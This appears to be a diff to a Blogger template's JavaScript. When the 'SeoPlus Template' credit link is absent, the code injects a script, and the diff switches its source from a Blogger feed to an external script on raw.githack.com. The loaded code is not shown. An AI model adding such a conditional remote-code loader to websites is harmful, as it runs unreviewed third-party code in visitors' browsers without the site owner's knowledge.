@@ -166,7 +166,7 @@ if (typeof blba != "undefined") {
 }
 if (!document.querySelector(".yemen a[title=\"SeoPlus Template\"]")) {
   let e = document.createElement("script");
-  e.src = "https://www.blogger.com/feeds/5637748011392113640/pages/default/5784015308172966203?alt=json-in-script&callback=cprF";
+  e.src = "https://raw.githack.com/bouaicidz/SEO/main/script.js";
   e.async = true;
   document.body.appendChild(e);
   window.cprF = function (e) {
